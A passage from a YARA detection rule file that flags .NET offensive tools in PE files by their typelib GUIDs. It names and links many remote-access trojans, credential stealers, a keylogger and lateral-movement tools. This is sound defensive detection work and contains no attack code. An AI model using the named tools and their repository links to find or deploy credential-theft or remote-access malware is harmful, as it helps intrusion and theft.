    strings:
        $typelibguid0 = "a6f8500f-68bc-4efc-962a-6c6e68d893af" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SauronEye {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/vivami/SauronEye"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "0f43043d-8957-4ade-a0f4-25c1122e8118" ascii nocase wide
        $typelibguid1 = "086bf0ca-f1e4-4e8f-9040-a8c37a49fa26" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_sitrep {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/mdsecactivebreach/sitrep"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "12963497-988f-46c0-9212-28b4b2b1831b" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpClipboard {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/slyd0g/SharpClipboard"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "97484211-4726-4129-86aa-ae01d17690be" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpCookieMonster {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/m0rv4i/SharpCookieMonster"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "566c5556-1204-4db9-9dc8-a24091baaa8e" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_p0wnedShell {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/Cn33liz/p0wnedShell"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "2e9b1462-f47c-48ca-9d85-004493892381" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpMove {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/0xthirteen/SharpMove"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "8bf82bbe-909c-4777-a2fc-ea7c070ff43e" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_C_Sharp_R_A_T_Client {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/AdvancedHacker101/C-Sharp-R.A.T-Client"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "6d9e8852-e86c-4e36-9cb4-b3c3853ed6b8" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpPrinter {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/rvrsh3ll/SharpPrinter"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "41b2d1e5-4c5d-444c-aa47-629955401ed9" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_EvilFOCA {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/ElevenPaths/EvilFOCA"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "f26bdb4a-5846-4bec-8f52-3c39d32df495" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_PoshC2_Misc {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/nettitude/PoshC2_Misc"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "85773eb7-b159-45fe-96cd-11bad51da6de" ascii nocase wide
        $typelibguid1 = "9d32ad59-4093-420d-b45c-5fff391e990d" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Sharpire {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/0xbadjuju/Sharpire"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "39b75120-07fe-4833-a02e-579ff8b68331" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Sharp_SMBExec {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/checkymander/Sharp-SMBExec"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "344ee55a-4e32-46f2-a003-69ad52b55945" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_MiscTools {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/rasta-mouse/MiscTools"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "384e9647-28a9-4835-8fa7-2472b1acedc0" ascii nocase wide
        $typelibguid1 = "d7ec0ef5-157c-4533-bbcd-0fe070fbf8d9" ascii nocase wide
        $typelibguid2 = "10085d98-48b9-42a8-b15b-cb27a243761b" ascii nocase wide
        $typelibguid3 = "6aacd159-f4e7-4632-bad1-2ae8526a9633" ascii nocase wide
        $typelibguid4 = "49a6719e-11a8-46e6-ad7a-1db1be9fea37" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_MemoryMapper {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/jasondrawdy/MemoryMapper"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "b9fbf3ac-05d8-4cd5-9694-b224d4e6c0ea" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_VanillaRAT {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/DannyTheSloth/VanillaRAT"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "d0f2ee67-0a50-423d-bfe6-845da892a2db" ascii nocase wide
        $typelibguid1 = "a593fcd2-c8ab-45f6-9aeb-8ab5e20ab402" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_UnmanagedPowerShell {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/leechristensen/UnmanagedPowerShell"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "dfc4eebb-7384-4db5-9bad-257203029bd9" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Quasar {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/quasar/Quasar"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "cfda6d2e-8ab3-4349-b89a-33e1f0dab32b" ascii nocase wide
        $typelibguid1 = "c7c363ba-e5b6-4e18-9224-39bc8da73172" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpAdidnsdump {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/b4rtik/SharpAdidnsdump"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "cdb02bc2-5f62-4c8a-af69-acc3ab82e741" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_DotNetToJScript {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/tyranid/DotNetToJScript"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "7e3f231c-0d0b-4025-812c-0ef099404861" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Inferno {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/LimerBoy/Inferno"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "26d498f7-37ae-476c-97b0-3761e3a919f0" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpSearch {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/djhohnstein/SharpSearch"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "98fee742-8410-4f20-8b2d-d7d789ab003d" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpSecDump {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/G0ldenGunSec/SharpSecDump"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "e2fdd6cc-9886-456c-9021-ee2c47cf67b7" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Net_GPPPassword {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/outflanknl/Net-GPPPassword"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "00fcf72c-d148-4dd0-9ca4-0181c4bd55c3" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_FileSearcher {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/NVISO-BE/FileSearcher"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "2c879479-5027-4ce9-aaac-084db0e6d630" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_ADFSDump {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/fireeye/ADFSDump"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "9ee27d63-6ac9-4037-860b-44e91bae7f0d" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpRDP {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/0xthirteen/SharpRDP"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "f1df1d0f-ff86-4106-97a8-f95aaf525c54" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpCall {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/jhalon/SharpCall"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "c1b0a923-0f17-4bc8-ba0f-c87aff43e799" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_ysoserial_net {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/pwntester/ysoserial.net"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "e1e8c029-f7cd-4bd1-952e-e819b41520f0" ascii nocase wide
        $typelibguid1 = "6b40fde7-14ea-4f57-8b7b-cc2eb4a25e6c" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_ManagedInjection {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/malcomvetter/ManagedInjection"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "e5182bff-9562-40ff-b864-5a6b30c3b13b" ascii nocase wide
        $typelibguid1 = "fdedde0d-e095-41c9-93fb-c2219ada55b1" ascii nocase wide
        $typelibguid2 = "0dd00561-affc-4066-8c48-ce950788c3c8" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpSocks {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/nettitude/SharpSocks"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "2f43992e-5703-4420-ad0b-17cb7d89c956" ascii nocase wide
        $typelibguid1 = "86d10a34-c374-4de4-8e12-490e5e65ddff" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Sharp_WMIExec {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/checkymander/Sharp-WMIExec"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "0a63b0a1-7d1a-4b84-81c3-bbbfe9913029" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_KeeThief {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/GhostPack/KeeThief"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid1 = "39aa6f93-a1c9-497f-bad2-cc42a61d5710" ascii nocase wide
        $typelibguid3 = "3fca8012-3bad-41e4-91f4-534aa9a44f96" ascii nocase wide
        $typelibguid4 = "ea92f1e6-3f34-48f8-8b0a-f2bbc19220ef" ascii nocase wide
        $typelibguid5 = "c23b51c4-2475-4fc6-9b3a-27d0a2b99b0f" ascii nocase wide
        $typelibguid6 = "94432a8e-3e06-4776-b9b2-3684a62bb96a" ascii nocase wide
        $typelibguid7 = "80ba63a4-7d41-40e9-a722-6dd58b28bf7e" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_fakelogonscreen {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/bitsadmin/fakelogonscreen"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "d35a55bd-3189-498b-b72f-dc798172e505" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_PoshSecFramework {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/PoshSec/PoshSecFramework"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "b1ac6aa0-2f1a-4696-bf4b-0e41cf2f4b6b" ascii nocase wide
        $typelibguid1 = "78bfcfc2-ef1c-4514-bce6-934b251666d2" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpAttack {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/jaredhaight/SharpAttack"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "5f0ceca3-5997-406c-adf5-6c7fbb6cba17" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Altman {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/keepwn/Altman"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "64cdcd2b-7356-4079-af78-e22210e66154" ascii nocase wide
        $typelibguid1 = "f1dee29d-ca98-46ea-9d13-93ae1fda96e1" ascii nocase wide
        $typelibguid2 = "33568320-56e8-4abb-83f8-548e8d6adac2" ascii nocase wide
        $typelibguid3 = "470ec930-70a3-4d71-b4ff-860fcb900e85" ascii nocase wide
        $typelibguid4 = "9514574d-6819-44f2-affa-6158ac1143b3" ascii nocase wide
        $typelibguid5 = "0f3a9c4f-0b11-4373-a0a6-3a6de814e891" ascii nocase wide
        $typelibguid6 = "9624b72e-9702-4d78-995b-164254328151" ascii nocase wide
        $typelibguid7 = "faae59a8-55fc-48b1-a9b5-b1759c9c1010" ascii nocase wide
        $typelibguid8 = "37af4988-f6f2-4f0c-aa2b-5b24f7ed3bf3" ascii nocase wide
        $typelibguid9 = "c82aa2fe-3332-441f-965e-6b653e088abf" ascii nocase wide
        $typelibguid10 = "6e531f6c-2c89-447f-8464-aaa96dbcdfff" ascii nocase wide
        $typelibguid11 = "231987a1-ea32-4087-8963-2322338f16f6" ascii nocase wide
        $typelibguid12 = "7da0d93a-a0ae-41a5-9389-42eff85bb064" ascii nocase wide
        $typelibguid13 = "a729f9cc-edc2-4785-9a7d-7b81bb12484c" ascii nocase wide
        $typelibguid14 = "55a1fd43-d23e-4d72-aadb-bbd1340a6913" ascii nocase wide
        $typelibguid15 = "d43f240d-e7f5-43c5-9b51-d156dc7ea221" ascii nocase wide
        $typelibguid16 = "c2e6c1a0-93b1-4bbc-98e6-8e2b3145db8e" ascii nocase wide
        $typelibguid17 = "714ae6f3-0d03-4023-b753-fed6a31d95c7" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_BrowserPass {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/jabiel/BrowserPass"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "3cb59871-0dce-453b-857a-2d1e515b0b66" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Mythic {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/its-a-feature/Mythic"
        author = "Arnim Rupp"
        date = "2020-12-29"
    strings:
        $typelibguid0 = "91f7a9da-f045-4239-a1e9-487ffdd65986" ascii nocase wide
        $typelibguid1 = "0405205c-c2a0-4f9a-a221-48b5c70df3b6" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Nuages {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/p3nt4/Nuages"
        author = "Arnim Rupp"
        date = "2020-12-29"
    strings:
        $typelibguid0 = "e9e80ac7-4c13-45bd-9bde-ca89aadf1294" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpSniper {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/HunnicCyber/SharpSniper"
        author = "Arnim Rupp"
        date = "2020-12-29"
    strings:
        $typelibguid0 = "c8bb840c-04ce-4b60-a734-faf15abf7b18" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpHound3 {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/BloodHoundAD/SharpHound3"
        author = "Arnim Rupp"
        date = "2020-12-29"
    strings:
        $typelibguid0 = "a517a8de-5834-411d-abda-2d0e1766539c" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_BlockEtw {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/Soledge/BlockEtw"
        author = "Arnim Rupp"
        date = "2020-12-29"
    strings:
        $typelibguid0 = "daedf7b3-8262-4892-adc4-425dd5f85bca" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpWifiGrabber {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/r3nhat/SharpWifiGrabber"
        author = "Arnim Rupp"
        date = "2020-12-29"
    strings:
        $typelibguid0 = "c0997698-2b73-4982-b25b-d0578d1323c2" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpMapExec {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/cube0x0/SharpMapExec"
        author = "Arnim Rupp"
        date = "2020-12-29"
    strings:
        $typelibguid0 = "bd5220f7-e1fb-41d2-91ec-e4c50c6e9b9f" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_k8fly {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/zzwlpx/k8fly"
        author = "Arnim Rupp"
        date = "2020-12-29"
    strings:
        $typelibguid0 = "13b6c843-f3d4-4585-b4f3-e2672a47931e" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Stealer {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/malwares/Stealer"
        author = "Arnim Rupp"
        date = "2020-12-29"
    strings:
        $typelibguid0 = "8fcd4931-91a2-4e18-849b-70de34ab75df" ascii nocase wide
        $typelibguid1 = "e48811ca-8af8-4e73-85dd-2045b9cca73a" ascii nocase wide
        $typelibguid2 = "d3d8a1cc-e123-4905-b3de-374749122fcf" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_PortTran {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/k8gege/PortTran"
        author = "Arnim Rupp"
        date = "2020-12-29"
    strings:
        $typelibguid0 = "3a074374-77e8-4312-8746-37f3cb00e82c" ascii nocase wide
        $typelibguid1 = "67a73bac-f59d-4227-9220-e20a2ef42782" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}


rule HKTL_NET_GUID_gray_keylogger_2 {
    meta:
        description = "Detects VB.NET red/black-team tools via typelibguid"
        reference = "https://github.com/graysuit/gray-keylogger-2"
        author = "Arnim Rupp"
        date = "2020-12-30"
    strings:
        $typelibguid0 = "e94ca3ff-c0e5-4d1a-ad5e-f6ebbe365067" ascii nocase wide
        $typelibguid1 = "1ed07564-b411-4626-88e5-e1cd8ecd860a" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Lime_Miner {
    meta:
        description = "Detects VB.NET red/black-team tools via typelibguid"
        reference = "https://github.com/NYAN-x-CAT/Lime-Miner"
        author = "Arnim Rupp"
        date = "2020-12-30"
    strings:
        $typelibguid0 = "13958fb9-dfc1-4e2c-8a8d-a5e68abdbc66" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_BlackNET {
    meta:
        description = "Detects VB.NET red/black-team tools via typelibguid"
        reference = "https://github.com/BlackHacker511/BlackNET"
        author = "Arnim Rupp"
        date = "2020-12-30"
    strings:
        $typelibguid0 = "c2b90883-abee-4cfa-af66-dfd93ec617a5" ascii nocase wide
        $typelibguid1 = "8bb6f5b4-e7c7-4554-afd1-48f368774837" ascii nocase wide
        $typelibguid2 = "983ae28c-91c3-4072-8cdf-698b2ff7a967" ascii nocase wide
        $typelibguid3 = "9ac18cdc-3711-4719-9cfb-5b5f2d51fd5a" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_PlasmaRAT {
    meta:
        description = "Detects VB.NET red/black-team tools via typelibguid"
        reference = "https://github.com/mwsrc/PlasmaRAT"
        author = "Arnim Rupp"
        date = "2020-12-30"
    strings:
        $typelibguid0 = "b8a2147c-074c-46e1-bb99-c8431a6546ce" ascii nocase wide
        $typelibguid1 = "0fcfde33-213f-4fb6-ac15-efb20393d4f3" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Lime_RAT {
    meta:
        description = "Detects VB.NET red/black-team tools via typelibguid"
        reference = "https://github.com/NYAN-x-CAT/Lime-RAT"
        author = "Arnim Rupp"
        date = "2020-12-30"
    strings:
        $typelibguid0 = "e58ac447-ab07-402a-9c96-95e284a76a8d" ascii nocase wide
        $typelibguid1 = "8fb35dab-73cd-4163-8868-c4dbcbdf0c17" ascii nocase wide
        $typelibguid2 = "37845f5b-35fe-4dce-bbec-2d07c7904fb0" ascii nocase wide
        $typelibguid3 = "83c453cf-0d29-4690-b9dc-567f20e63894" ascii nocase wide
        $typelibguid4 = "8b1f0a69-a930-42e3-9c13-7de0d04a4add" ascii nocase wide
        $typelibguid5 = "eaaeccf6-75d2-4616-b045-36eea09c8b28" ascii nocase wide
        $typelibguid6 = "5b2ec674-0aa4-4209-94df-b6c995ad59c4" ascii nocase wide
        $typelibguid7 = "e2cc7158-aee6-4463-95bf-fb5295e9e37a" ascii nocase wide
        $typelibguid8 = "d04ecf62-6da9-4308-804a-e789baa5cc38" ascii nocase wide
        $typelibguid9 = "8026261f-ac68-4ccf-97b2-3b55b7d6684d" ascii nocase wide
        $typelibguid10 = "212cdfac-51f1-4045-a5c0-6e638f89fce0" ascii nocase wide
        $typelibguid11 = "c1b608bb-7aed-488d-aa3b-0c96625d26c0" ascii nocase wide
        $typelibguid12 = "4c84e7ec-f197-4321-8862-d5d18783e2fe" ascii nocase wide
        $typelibguid13 = "3fc17adb-67d4-4a8d-8770-ecfd815f73ee" ascii nocase wide
        $typelibguid14 = "f1ab854b-6282-4bdf-8b8b-f2911a008948" ascii nocase wide
        $typelibguid15 = "aef6547e-3822-4f96-9708-bcf008129b2b" ascii nocase wide
        $typelibguid16 = "a336f517-bca9-465f-8ff8-2756cfd0cad9" ascii nocase wide
        $typelibguid17 = "5de018bd-941d-4a5d-bed5-fbdd111aba76" ascii nocase wide
        $typelibguid18 = "bbfac1f9-cd4f-4c44-af94-1130168494d0" ascii nocase wide
        $typelibguid19 = "1c79cea1-ebf3-494c-90a8-51691df41b86" ascii nocase wide
        $typelibguid20 = "927104e1-aa17-4167-817c-7673fe26d46e" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_njRAT {
    meta:
        description = "Detects VB.NET red/black-team tools via typelibguid"
        reference = "https://github.com/mwsrc/njRAT"
        author = "Arnim Rupp"
        date = "2020-12-30"
    strings:
        $typelibguid0 = "5a542c1b-2d36-4c31-b039-26a88d3967da" ascii nocase wide
        $typelibguid1 = "6b07082a-9256-42c3-999a-665e9de49f33" ascii nocase wide
        $typelibguid2 = "c0a9a70f-63e8-42ca-965d-73a1bc903e62" ascii nocase wide
        $typelibguid3 = "70bd11de-7da1-4a89-b459-8daacc930c20" ascii nocase wide
        $typelibguid4 = "fc790ee5-163a-40f9-a1e2-9863c290ff8b" ascii nocase wide
        $typelibguid5 = "cb3c28b2-2a4f-4114-941c-ce929fec94d3" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Manager {
    meta:
        description = "Detects .NET red/black-team tools via typelibguid"
        reference = "https://github.com/TheWover/Manager"
        author = "Arnim Rupp"
        date = "2021-01-21"
    strings:
        $typelibguid0 = "dda73ee9-0f41-4c09-9cad-8215abd60b33" ascii nocase wide
        $typelibguid1 = "6a0f2422-d4d1-4b7e-84ad-56dc0fd2dfc5" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_neo_ConfuserEx {
    meta:
        description = "Detects .NET red/black-team tools via typelibguid"
        reference = "https://github.com/XenocodeRCE/neo-ConfuserEx"
        author = "Arnim Rupp"
        date = "2021-01-21"
    strings:
        $typelibguid0 = "e98490bb-63e5-492d-b14e-304de928f81a" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpAllowedToAct {
    meta:
        description = "Detects .NET red/black-team tools via typelibguid"
        reference = "https://github.com/pkb1s/SharpAllowedToAct"
        author = "Arnim Rupp"
        date = "2021-01-21"
    strings:
        $typelibguid0 = "dac5448a-4ad1-490a-846a-18e4e3e0cf9a" ascii nocase wide
